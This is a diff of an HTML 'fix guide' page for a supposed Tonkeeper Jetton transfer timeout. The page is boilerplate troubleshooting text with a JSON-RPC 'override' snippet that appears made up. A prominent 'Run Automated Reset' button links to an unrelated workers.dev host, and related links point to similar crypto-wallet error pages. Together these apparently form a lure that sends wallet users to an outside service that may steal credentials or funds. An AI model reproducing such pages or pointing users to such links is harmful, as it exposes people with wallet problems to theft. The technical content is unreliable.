@@ -3,7 +3,7 @@
 <head><meta charset="UTF-8"><title>Tonkeeper Jetton Transfer Loop Timeout – Fix Guide</title>
 <style>
     body {
-        font-family: system-ui;
+        font-family: BlinkMacSystemFont;
         background: #121214;
         color: #ddd;
         padding: 20px;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #00adb5; }
+    a { color: #ff9455; }
     .btn {
-        background: #cf6679;
+        background: #ff7b2c;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -40,33 +40,40 @@
 <body>
 <div class="content">
 <h1>Tonkeeper Jetton Transfer Loop Timeout</h1>
-<h1>Tonkeeper Jetton Transfer Loop Timeout</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users experience a timeout error when attempting to transfer Tonkeeper Jettons, resulting in failed transactions and an inability to complete the transfer process.</li>
+<li>Users encounter a timeout error when attempting to transfer Tonkeeper Jettons, resulting in failed transactions and potential loss of funds. The error message "Tonkeeper Jetton transfer loop timeout" is displayed, indicating a failure in the transfer process.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a prolonged loop in the transfer process, likely caused by network congestion, insufficient gas, or incorrect smart contract configuration.</li>
+<li>The error occurs due to a loop timeout in the Tonkeeper smart contract, which is responsible for handling Jetton transfers. This loop timeout can be caused by various factors, including network congestion, contract errors, or insufficient gas.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
 <li>To resolve the issue, try the following manual overrides:</li>
-<li>Increase the gas limit for the transaction</li>
-<li>Verify the smart contract configuration and ensure it is correctly deployed</li>
-<li>Use a custom transfer script to bypass the loop:</li>
+<li>Increase the gas limit for the transaction to ensure sufficient resources for the contract execution.</li>
+<li>Verify the contract code for any errors or bugs that may be causing the loop timeout.</li>
+<li>Use the following JSON-RPC command to override the contract settings:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>tonos-cli<span class="w"> </span>call<span class="w"> </span>&lt;contract_address&gt;<span class="w"> </span>transferJetton<span class="w"> </span><span class="s2">&quot;&lt;recipient_address&gt;&quot;</span><span class="w"> </span><span class="s2">&quot;&lt;amount&gt;&quot;</span><span class="w"> </span>--abi<span class="w"> </span>&lt;abi_file&gt;
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;method&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;ton_sendTransaction&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;params&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;contract&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;JettonContract&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;function&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;transfer&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;args&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;recipient_address&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;amount&quot;</span><span class="p">],</span>
+<span class="w">    </span><span class="nt">&quot;gas&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;1000000&quot;</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more advanced debugging and transaction management.</p>
+<p>Consider using an external console for more advanced troubleshooting and contract interaction.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Tonos-cli installed and configured</li>
-<li>Sufficient TON coins for gas</li>
-<li>Correct smart contract ABI file</li>
+<li>Ton Wallet installed and configured</li>
+<li>Sufficient TON funds for gas and transaction fees</li>
+<li>Basic understanding of Tonkeeper smart contract functionality</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html"># Symptom</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html"># Symptom</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Symptom</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-account-discovery-and-syncs-error-for-so.html">Metamask Extension Bug Account Discovery And Syncs Error For Social Login Import Users</a></li><li><a href="./archive/2026/06/go-ethereum-evmone-t8n-rejects-transactions-with-chainid-0xff-p.html">Go Ethereum Evmone T8N Rejects Transactions With Chainid 0Xff P</a></li><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gJ%3Cx" class="btn">🛠 Run Automated Reset</a>
 </div>
